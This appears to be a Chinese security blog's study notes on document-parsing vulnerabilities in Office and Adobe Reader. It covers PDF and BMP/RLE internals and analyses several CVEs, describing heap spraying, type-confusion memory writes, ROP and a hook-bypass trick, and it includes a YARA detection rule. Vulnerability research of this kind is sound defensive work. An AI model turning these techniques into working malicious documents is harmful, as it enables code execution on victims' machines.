    <content type="html"><![CDATA[<p>在我眼中，文档型漏洞就是，Office系列跟Adobe系列，或者其它要解析文档的程序，解析文档有内存控制问题，达到恶意文档可以产生RCE的目的。可能还有一些Word解析公式的问题，暂且都归为文档型，因为具体叫什么怎么分，我也不会分。还有VS Code的RCE的问题，不知道能不能算文档型。</p><p>感觉基本就是将在CTF pwn题中学到的东西投入现实使用了。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p><a href="http://www.greyhathacker.net/" target="_blank" rel="noopener">Dokany/Google Drive File Stream Kernel Stack-based Buffer Overflow Vulnerability</a></p><h3 id="PDF文件解析与恶代分析"><a href="#PDF文件解析与恶代分析" class="headerlink" title="PDF文件解析与恶代分析"></a><a href="https://zhuanlan.zhihu.com/p/30597307" target="_blank" rel="noopener">PDF文件解析与恶代分析</a></h3><h4 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h4><ul><li>文件头——指明了该文件所遵从的PDF规范的版本号，它出现在PDF文件的第一行。</li><li>文件体——又称对象集合，PDF文件的主要部分，由一系列对象组成。</li><li>交叉引用表——对对象进行随机存取而设立的一个间接对象的地址索引表。（实际以偏移+索引的方式储存对象地址，下文会提及）</li><li>文件尾——声明了交叉引用表的地址，即指明了文件体的根对象（Catalog），从而能够找到PDF文件中各个对象体的位置，达到随机访问。另外还保存了PDF文件的加密等安全信息。文件尾说明了根对象的对象号，并且说明交叉引用表的位置，通过对交叉引用表的查询可以找到目录对象(Catalog)。</li></ul><h4 id="然后大致结构组织是这样的"><a href="#然后大致结构组织是这样的" class="headerlink" title="然后大致结构组织是这样的"></a>然后大致结构组织是这样的</h4><ul><li>文件头<ul><li>目录对象</li><li>Pages Root<ul><li>Page1页面（page）对象为PDF中最重要的对象，包含如何显示该页面的信息，例如使用的字体，包含的内容（文字，图片等），页面的大小。里面的信息可以直接给出，当然里面的子项更多的是对其他对象的引用，真正的信息存放在其他对象里面。页面中包含的信息是包含在一个称为流（stream）的对象里，这个流的长度（字节数）必须直接给出或指向另外一个对象（包含一个整数值，表明这个流的长度）。</li><li>Page2</li></ul></li><li>Outline Root</li></ul></li></ul><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">obj            <span class="comment">#obj对象开始</span></span><br><span class="line">endobj         <span class="comment">#obj对象结束</span></span><br><span class="line">stream         <span class="comment">#stream流对象开始</span></span><br><span class="line">endstream      <span class="comment">#stream流对象结束</span></span><br><span class="line">xref           <span class="comment">#交叉引用表开始</span></span><br><span class="line">trailer        <span class="comment">#文件尾对象开始</span></span><br><span class="line">startxref      <span class="comment">#交叉引用表结束</span></span><br><span class="line">/Page          <span class="comment">#文件页数</span></span><br><span class="line">/Encrypt       <span class="comment">#是否加密</span></span><br><span class="line">/ObjStm        <span class="comment">#objectstreams的数量，objectstreams可包含其他Object对象，即嵌套</span></span><br><span class="line">/JS            <span class="comment">#代表javascript嵌有JavaScript代码，可直接提取恶意代码</span></span><br><span class="line">/JavaScript    <span class="comment">#代表javascript嵌有JavaScript代码，可直接提取恶意代码</span></span><br><span class="line">/AA            <span class="comment">#以下三个为特定特征，打开对象自动执行</span></span><br><span class="line">/OpenAction</span><br><span class="line">/AcroForm</span><br><span class="line">/URI           <span class="comment">#内嵌url链接</span></span><br><span class="line">/Filter        <span class="comment">#/Filter字段出现，表示了下面的stream流进行了加密</span></span><br><span class="line">/RichMedia     <span class="comment">#富文本</span></span><br><span class="line">/Launch        <span class="comment">#执行Action的次数与OpenAction字段关联</span></span><br><span class="line"><span class="comment">#/xxxx 带斜杠的关键字包含在&lt;&lt;&gt;&gt;字典内部</span></span><br></pre></td></tr></table></figure><h4 id="流的提取"><a href="#流的提取" class="headerlink" title="流的提取"></a>流的提取</h4><p>/Filter关键字之后保存了stream流的编码信息一共包括以下几种：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/FlateDecode</span><br><span class="line">/ASCIIHexDecode</span><br><span class="line">/ASCII85Decode</span><br><span class="line">/LZWDecode</span><br><span class="line">/DCTDecode</span><br><span class="line">/RunLengthDecode</span><br><span class="line">/CCITTFaxDecode</span><br><span class="line">/JBIG2Decode</span><br><span class="line">/JPXDecode</span><br><span class="line">/Crypt</span><br></pre></td></tr></table></figure><h4 id="还有一些其它对抗的坑"><a href="#还有一些其它对抗的坑" class="headerlink" title="还有一些其它对抗的坑"></a>还有一些其它对抗的坑</h4><ul><li>引用表偏移不正确</li><li>引用表可以有多个</li><li>流对象长度可以直接跟对象</li><li>流对象长度可以为任意值</li><li>javascript可以支持文本和八进制</li><li>编码方式缩写形式</li><li>编码形式可以级联</li></ul><h3 id="位图简介"><a href="#位图简介" class="headerlink" title="位图简介"></a>位图简介</h3><h4 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h4><p>Bitmap File Header<br>Bitmap Info Header<br>RGBQUAD Array<br>Bitmap Data</p><h5 id="Bitmap-File-Header"><a href="#Bitmap-File-Header" class="headerlink" title="Bitmap File Header"></a>Bitmap File Header</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span></span><br><span class="line">  WORD  bfType;         <span class="comment">// 文件标记 'BM'</span></span><br><span class="line">  DWORD bfSize;         <span class="comment">// 位图文件的大小</span></span><br><span class="line">  WORD  bfReserved1;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  WORD  bfReserved2;    <span class="comment">// 保留字段 0</span></span><br><span class="line">  DWORD bfOffBits;      <span class="comment">// 位图数据在文件中的偏移值</span></span><br><span class="line">&#125; BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;</span><br></pre></td></tr></table></figure><h5 id="BITMAP-INFO-HEADER"><a href="#BITMAP-INFO-HEADER" class="headerlink" title="BITMAP INFO HEADER"></a>BITMAP INFO HEADER</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RGB  0  <span class="comment">// 未使用压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE8 1  <span class="comment">// RLE8 压缩算法</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BI_RLE4 2  <span class="comment">// RLE4 压缩算法</span></span></span><br><span class="line"><span class="comment">// 其他压缩算法...</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span> &#123;</span></span><br><span class="line">  DWORD biSize;             <span class="comment">// 结构体的大小</span></span><br><span class="line">  LONG  biWidth;            <span class="comment">// 位图宽度</span></span><br><span class="line">  LONG  biHeight;           <span class="comment">// 位图高度</span></span><br><span class="line">  WORD  biPlanes;           <span class="comment">// 必须为 1</span></span><br><span class="line">  WORD  biBitCount;         <span class="comment">// 每个像素所占用的位数</span></span><br><span class="line">  DWORD biCompression;      <span class="comment">// 压缩算法</span></span><br><span class="line">  DWORD biSizeImage;        <span class="comment">// 数据大小</span></span><br><span class="line">  LONG  biXPelsPerMeter;    <span class="comment">// 水平分辨率</span></span><br><span class="line">  LONG  biYPelsPerMeter;    <span class="comment">// 垂直分辨率</span></span><br><span class="line">  DWORD biClrUsed;          <span class="comment">// 色彩索引数</span></span><br><span class="line">  DWORD biClrImportant;     <span class="comment">// 必须的色彩索引数</span></span><br><span class="line">&#125; BITMAPINFOHEADER, *PBITMAPINFOHEADER;</span><br></pre></td></tr></table></figure><h5 id="RGBQUAD-ARRAY"><a href="#RGBQUAD-ARRAY" class="headerlink" title="RGBQUAD ARRAY"></a>RGBQUAD ARRAY</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagRGBQUAD</span> &#123;</span></span><br><span class="line">  BYTE rgbBlue;</span><br><span class="line">  BYTE rgbGreen;</span><br><span class="line">  BYTE rgbRed;</span><br><span class="line">  BYTE rgbReserved;</span><br><span class="line">&#125; RGBQUAD;</span><br></pre></td></tr></table></figure><h5 id="BITMAP-DATA"><a href="#BITMAP-DATA" class="headerlink" title="BITMAP DATA"></a>BITMAP DATA</h5><p>位图的位数据，该部分数据的表现形式取决于位图所使用的压缩算法。</p><p>有一点需要注意的是：位图数据是从左下角往右上角方向进行填充的，即位图数据中解析出来的第一个像素的色彩，应当填充到位图的左下角，随后依次填充当前行的像素，当前行填充完毕之后，往上移动一个像素继续以行位单位进行填充，直到位图填充完毕。</p><h3 id="RLE-编码"><a href="#RLE-编码" class="headerlink" title="RLE 编码"></a>RLE 编码</h3><h4 id="RLE8"><a href="#RLE8" class="headerlink" title="RLE8"></a>RLE8</h4><p>RLE8 压缩算法用于压缩 8 位位图（即每个像素占用 1 字节空间）。RLE8 压缩后的数据可以处于 编码模式（Encoded Mode） 和 绝对模式（Absolute Mode） 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p>编码模式 包含两字节数据：</p><ul><li>如果第一个字节不为零，其含义为第二个字节需要重复的次数</li><li>如果第一个字节为零，那么第二个字节的可能含义如下<ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 (deltaX, deltaY) 为当前坐标 (x, y) 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 [0x03, 0xFF] 。第二个字节表示接下来特定数量的字节是未压缩的数据（数据量需要按 WORD 对齐）。</p><p>下面为 RLE8 压缩之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]</span><br><span class="line">[02 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">04 04 04</span><br><span class="line">06 06 06 06 06</span><br><span class="line">45 56 67</span><br><span class="line">78 78</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">78 78</span><br><span class="line">end of line</span><br><span class="line">1E 1E 1E 1E 1E 1E 1E 1E 1E</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h4 id="RLE4-编码"><a href="#RLE4-编码" class="headerlink" title="RLE4 编码"></a>RLE4 编码</h4><p>RLE4 压缩算法用于压缩 4 位位图（即每个像素占用半字节空间）。RLE4 压缩后的数据可以处于 编码模式（Encoded Mode） 和 绝对模式（Absolute Mode） 中的任意一种（两种模式在同一个位图中可以同时出现）。</p><p>编码模式 包含两字节数据：</p><ul><li>如果第一个字节不为零，其含义为第二个字节展开后得到的像素个数<ul><li>第二个字节代表了两个像素的色彩索引</li><li>高 4 位代表第一个像素的色彩索引</li><li>低 4 位代表第二个像素的色彩索引</li><li>二者依次交替重复，直到得到第一个字节指定的像素个数</li></ul></li><li>如果第一个字节为零，那么第二个字节的可能含义如下<ul><li>0x00 表示当前行已经结束</li><li>0x01 表示位图解析完毕</li><li>0x02 表示接下来的两个字节 (deltaX, deltaY) 为当前坐标 (x, y) 需要移动的距离</li></ul></li></ul><p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 [0x03, 0xFF] 。第二个字节表示接下来特定数量的 半字节 是未压缩的数据（数据量需要按 WORD 对齐）。</p><p>下面为 RLE4 压缩之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]</span><br><span class="line">[04 78] [00 00] [09 1E] [00 01]</span><br></pre></td></tr></table></figure><p>下面为解压之后的数据：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0 4 0</span><br><span class="line">0 6 0 6 0</span><br><span class="line">4 5 5 6 6 7</span><br><span class="line">7 8 7 8</span><br><span class="line">move current position 5 right and 1 up</span><br><span class="line">7 8 7 8</span><br><span class="line">end of line</span><br><span class="line">1 E 1 E 1 E 1 E 1</span><br><span class="line">end of RLE bitmap</span><br></pre></td></tr></table></figure><h3 id="SpiderMonkey-基础知识"><a href="#SpiderMonkey-基础知识" class="headerlink" title="SpiderMonkey 基础知识"></a>SpiderMonkey 基础知识</h3><p>Adobe Acrobat Reader DC 所使用的 JavaScript 引擎为 SpiderMonkey。</p><h3 id="怎么执行js代码"><a href="#怎么执行js代码" class="headerlink" title="怎么执行js代码"></a>怎么执行js代码</h3><p>为了实现漏洞利用，需要在触发漏洞前完成内存布局、在触发漏洞后完成后续利用步骤，而这些操作都需要借助执行 JavaScript 代码来完成，因此需要在不同的时间点执行不同的 JavaScript 代码，这可以通过给 subform 的 initialize 事件和 docReady 事件设置事件处理代码来完成。</p><p>总之就是可以设置事件处理代码。</p><h2 id="“噩梦公式漏洞”：CVE-2017-11882-Microsoft-Office-Word-栈溢出漏洞"><a href="#“噩梦公式漏洞”：CVE-2017-11882-Microsoft-Office-Word-栈溢出漏洞" class="headerlink" title="“噩梦公式漏洞”：CVE-2017-11882 Microsoft Office Word 栈溢出漏洞"></a>“噩梦公式漏洞”：CVE-2017-11882 Microsoft Office Word 栈溢出漏洞</h2><p><a href="https://www.sunxiaokong.xyz/2020-01-11/CVE-2017-11882-analysis/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-11/CVE-2017-11882-analysis/</a></p><p>这个是一个栈溢出。<a href="https://github.com/embedi/CVE-2017-11882/blob/master/example/exploit.rtf">POC</a>长这样。</p><p>由于EQNEDT32.EXE在解析Equation.3 OLE对象中的MTEF数据流里的font类型记录时，没有对font name的长度进行判断，将其复制入0x28大小的栈空间时可发生溢出，并可覆盖返回地址。由于存在漏洞的EQNEDT32.EXE年代久远，没有开启ASLR、GS等漏洞缓解措施，只需要简单的将返回地址覆盖成同模块内的call WinExec()指令地址即可稳定地完成漏洞利用。</p><h2 id="CVE-2015-1641-Word-利用样本分析-类型混淆"><a href="#CVE-2015-1641-Word-利用样本分析-类型混淆" class="headerlink" title="CVE-2015-1641 Word 利用样本分析 类型混淆"></a>CVE-2015-1641 Word 利用样本分析 类型混淆</h2><p><a href="https://paper.seebug.org/351/" target="_blank" rel="noopener">https://paper.seebug.org/351/</a></p><p>基本是一波调试分析POC。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>smartTag标签是用于word和excel中的智能标签，针对人名、日期、时间、地址、电话号码等进行智能识别并允许用户执行特定操作的标签。比如如果Steve Jobs被识别为人名，则smartTag标签可以执行诸如打开通讯录、添加到联系人、预约会议等操作，给office用户提供更多自定义的智能选择。displacedByCustomXml在很多标签中都可以使用，目的是当前标签处需要被一个customXML中的内容代替，它的值是next表示被下一个customXML代替，prev则表示被上一个代替。</p><p>这个漏洞是一个类型混淆漏洞，本来带有displacedByCustomXml的标签会被上一个或下一个customXML代替，但是word没有对传入的customXML对象进行严格的校验，导致可以传入诸如smartTag对象，然而smartTag对象的处理流程和customXML并不相同，上述特殊处理的smartTag标签中的element属性值会被当作是一个地址，随后经过简单的计算得到另一个地址。最后处理流程会将moveFromRangeEnd的id值覆盖到之前计算出来的地址中，导致任意内存写入。</p><p>总之就是微软没有分清自家亲兄弟<code>customXML</code>和<code>smartTag</code>，造成的类型混淆。</p><h3 id="然后就是堆喷常规的套路"><a href="#然后就是堆喷常规的套路" class="headerlink" title="然后就是堆喷常规的套路"></a>然后就是堆喷常规的套路</h3><ol><li>先要加载msvcr71.dll，它没开地址随机化保护，有稳定的对象用。</li><li>使用40个ActiveX控件进行堆喷，可以参考<a href="https://weiyiling.cn/one/cve_2013_3906_ms13-096" target="_blank" rel="noopener">这里</a>。</li><li>对smartTag_1（第一个smartTag标签）的element属性值进行简单计算得到一个地址addr1；</li><li>将其moveFromRangeEnd_1子标签的id写入到addr1中备用；</li><li>解析smartTag_2，根据他的element属性值和前面计算出来的addr1共同计算出另一个地址addr2，并将其子标签moveFromRangeEnd_2的id写入到addr2，而addr2是一个虚函数表中的地址，这样原本是这个虚函数的地址就被覆盖成攻击者想要执行的任意代码的地址，漏洞利用成功。</li></ol><h3 id="漏洞利用检测"><a href="#漏洞利用检测" class="headerlink" title="漏洞利用检测"></a>漏洞利用检测</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rule CVE_2015_1641</span><br><span class="line">&#123;</span><br><span class="line">       meta:</span><br><span class="line">              description=<span class="string">"Word Type Confusion Vulnerability"</span></span><br><span class="line">              output=<span class="string">"Nday &amp; CVE-2015-1641"</span></span><br><span class="line">       strings:</span><br><span class="line">              $smart_tag=/&lt;w:smartTag[\w\W]+?w:element=\<span class="string">"(&amp;#x[a-zA-Z0-9]&#123;4&#125;;)&#123;2&#125;\"&gt;[\w\W]+?&lt;w:permStart[\w\W]+?w:displacedByCustomXml=\"prev\"\/&gt;[\w\W]+?&lt;w:permEnd[\w\W]+?&lt;\/w:smartTag&gt;/</span></span><br><span class="line"><span class="string">       condition:</span></span><br><span class="line"><span class="string">              $smart_tag</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><a href="https://weiyiling.cn/one/cve_2015_1641_ms15-033" target="_blank" rel="noopener">这篇</a>说的也比较清楚。</p><h2 id="CVE-2015-2545-Word-利用样本分析-UAF"><a href="#CVE-2015-2545-Word-利用样本分析-UAF" class="headerlink" title="CVE-2015-2545 Word 利用样本分析 UAF"></a>CVE-2015-2545 Word 利用样本分析 UAF</h2><p><a href="https://paper.seebug.org/368/" target="_blank" rel="noopener">https://paper.seebug.org/368/</a></p><p>PostScript相关，解析图形文件时有UAF。当通过 forall 操作 dict2 对象时，将对 dict2 中的 ‘key-value’ 进行迭代处理，且 pNext 指针指向下一对待处理的 ‘key-value’。然而，proc 中存在 dict1 dict2 copy 的操作，此过程会先释放掉 dict2 原有的 ‘key-value’ 空间，之后再申请新空间进行接下来的拷贝，即原先 pNext 指向的 ‘key-value’ 空间被释放了。而后在 putinterval 操作中将重新用到原先 pNext 指向的空间，并向其中写入特定的字符串。因此，在下一次迭代时，pNext 指向的数据就变成了我们所构造的 ‘key-value’。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>PostScript是office用来解析图形的jio本。它跟office的关系和v8跟chrome的关系差不多。</p><p>在 PostScript 中会为每个 string 对象分配专门的 buffer 用于存储实际的字符串内容，其基址及大小就保存在该 string 对象中。就最终样本伪造的 string 对象来说，其 buffer 基址为 0x00000000，且大小为 0x7fffffff，因此借助此对象可以实现任意内存的读写。</p><p>小技巧来绕过保护程序对 ZwProtectVirtualMemory 调用的检测，对于 ntdll 模块中的 Nt/Zw 函数，除了赋给 eax 寄存器的 id 不同外，其余部分都是相同的。ROP 链在完成 eax 的赋值后，也就是将 ZwProtectVirtualMemory 函数中的 id 赋给 eax 后，会直接跳过 ZwCreateEvent 函数（该函数未被 hook）的前5字节并执行余下的那部分指令，通过这种方式能实现任意的系统调用而不会被检测到。</p><p>总之就修改指针到ROP链上。</p><h2 id="PDF漏洞（CVE-2018-12794）浅析"><a href="#PDF漏洞（CVE-2018-12794）浅析" class="headerlink" title="PDF漏洞（CVE-2018-12794）浅析"></a>PDF漏洞（CVE-2018-12794）浅析</h2><p><a href="https://www.anquanke.com/post/id/177861" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177861</a></p><p>先介绍下什么是XDP。</p><p>XML Data Package（XDP）是Adobe Systems创建的XML 文件格式。该格式允许将PDF内容或Adobe XML Forms Architecture（XFA）资源打包在XML 容器中。XDP符合XML 1.0的规范，可以作为独立文档，也可以在PDF文档中携带。XDP提供了一种在XML容器中打包表单组件的机制，XDP还可以打包PDF文件以及XML表单和模板数据。</p><p>然后通过调试POC，分析crash的点，推测出来，漏洞的根本原因是代码在处理Template对象时使用了Form对象的函数进行处理，造成了类型混淆漏洞。</p><h2 id="E-2018-4990-Adobe-Reader代码执行漏洞利用分析"><a href="#E-2018-4990-Adobe-Reader代码执行漏洞利用分析" class="headerlink" title="E-2018-4990 Adobe Reader代码执行漏洞利用分析"></a>E-2018-4990 Adobe Reader代码执行漏洞利用分析</h2><p><a href="https://www.freebuf.com/articles/system/173095.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/173095.html</a></p><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>2018年5月15日，ESET发布文章“A tale of two zero-days”，该文章披露了今年3月ESET在恶意软件扫描引擎（VirusTotal）上捕获了一个用于攻击测试的PDF文档。该PDF文档样本包含两枚0-day漏洞（CVE-2018-4990，CVE-2018-8120）以实现针对Adobe Acrobat/Reader PDF阅读器的任意代码执行。其中CVE-2018-4990为Adobe PDF阅读器的代码执行漏洞，而CVE-2018-8120则是Windows操作系统Win32k的内核提权漏洞，在获取代码执行权限后通过内核提权漏洞绕过Adobe PDF阅读器的沙盒保护，实现任意代码执行。</p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><h4 id="poi-poi-esi-0×48-0x0c-这个被遍历的地址是如何被分配的"><a href="#poi-poi-esi-0×48-0x0c-这个被遍历的地址是如何被分配的" class="headerlink" title="poi(poi(esi+0×48)+0x0c)这个被遍历的地址是如何被分配的"></a>poi(poi(esi+0×48)+0x0c)这个被遍历的地址是如何被分配的</h4><p>通过调试回溯，我们找到了具体的jp2h解析函数，其对应的参数如下：参数1：getField(“Button1″)获取的图片的实际大小；参数2：poi(poi(esi+0×48)+0x0c)；参数3：图片的对象，可以看到包含的具体图片内容；函数调用前，poi(poi(esi+0×48)+0x0c)这个地址初始化为零，继续跟踪调试可以看到，给poi(poi(esi+0×48)+0x0c)分配的内存地址大小为0x3f4，即一个a1中的hole，而图片的实际大小则是0x3f4，正好用于填补a1的hole，poi(poi(esi+0×48)+0x0c)为pg2h解析时分配，其实际大小和图片大小一致（0x3f4），正好填补a1中的hole，而在loop逻辑处理poi(poi(esi+0×48)+0x0c)时，由于长度为0xfe（0xfe*4 = 0x3f8），所以越界8字节刚好读到hole中残留的攻击者部署地址。</p><h4 id="poi-poi-esi-0×48-0×04-处的0xff来自何处"><a href="#poi-poi-esi-0×48-0×04-处的0xff来自何处" class="headerlink" title="poi(poi(esi+0×48)+0×04)处的0xff来自何处"></a>poi(poi(esi+0×48)+0×04)处的0xff来自何处</h4><p>其中控制loop循环次数的0xff，实际在poi(poi(esi+0×48)+0×4)的位置。通过回溯分析，发现该值同样来自pg2h函数中的解析。调试知道，其赋值来自于pg2h第三个参数，图片对象+10的位置。这个变量主要用于标记解析图片时的指针，当解析图片时，该指针从图片的开始一直递加，直到图片尾部，如下图所示为扫描到图片中间时的值。扫描完之后发现该指针指向后面的一片fffffff的内容，此时通过该指针给poi(poi(esi+0×48)+0×4)赋值时即为对应的0xff，从而导致之后的越界读（这个地方感觉应该是pclr后面应该还有字段，突然截断了导致了一个错误的残留指针）。</p><h3 id="漏洞利用回溯分析"><a href="#漏洞利用回溯分析" class="headerlink" title="漏洞利用回溯分析"></a>漏洞利用回溯分析</h3><p>JavaScript代码中则通过两个Array实例sprayarr及a1来实现内存Spray布局，这里需要注意的是a1对Array中奇数下标的element进行了释放，这是UAF类漏洞利用中常见的一种内存布局手法。</p><p>通过sprayarra2赋值抢占该0×20000的内存，一旦分配成功，即变相的将sprayarr中0x0d0f0048位置的element的长度从0xffe8修改为0x11fe8。</p><h3 id="整个漏洞利用过程"><a href="#整个漏洞利用过程" class="headerlink" title="整个漏洞利用过程"></a>整个漏洞利用过程</h3><p>通过以上的分析过程可知漏洞函数JP2KLib!JP2kCopyRect+0xbae6中对访问的buffer检验有误，导致可以越界读取之后8字节的内容（0xff的获取有可能是pclr突然中断导致），所以该8字节的内容为攻击者可控，并在之后用于精确释放内存，最终通过精确释放，并重用该释放的地址，获取一个超长element，以实现全局内存读写，最终导致任意代码执行。</p><ol><li>通过heap spray a1布置大量比buffer稍大的Uint32Array，将Uint32Array中249,250位置的element设置为需要释放的地址，之后将a1中奇数elemnt释放（以便于之后JP2KLib中解析图片时被分配到）。</li><li>heap spray sprayarr布置之后需要释放的内存对象（即sprayarr）。</li><li>通过加载指定大小的jp2k图片，导致解析jp2k图片时分配的内存为之前某一个a1中的hole，之后运行到JP2KLib!JP2kCopyRect+0xbae6，漏洞触发越界读取249,250偏移处（即sprayarr中两个相连的elment）的内存并释放（合计0×20000），转化为类UAF的利用。</li><li>同上。</li><li>通过sprayarr2的赋值抢占释放的0×20000内存，一旦抢占成功，sprayarr中之前被释放的elment的长度就会被修改为0×20000。</li><li>最终通过精确释放，并重用该释放地址，获取一个超长element，以实现全局内存读写，再通过全局内存读写，伪造bookmarkRoot的对象实现任意代码执行。好像是因为bookmarkRoot有个execute，方便直接执行。</li></ol><h2 id="深入分析Adobe忽略了6年的PDF漏洞"><a href="#深入分析Adobe忽略了6年的PDF漏洞" class="headerlink" title="深入分析Adobe忽略了6年的PDF漏洞"></a>深入分析Adobe忽略了6年的PDF漏洞</h2><p><a href="https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><blockquote><p>Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability<br>The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.</p></blockquote><h3 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h3><p>硬核diff补丁，发现解析RLE时有溢出，整数溢出。也就是CVE-2013时修了，没修好那个。</p><p>具体可以看到下面，明显有个溢出可以过检查，下面可以越界写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F AcroForm 2019.012.20036 中修复的基本块</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width ||</span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span 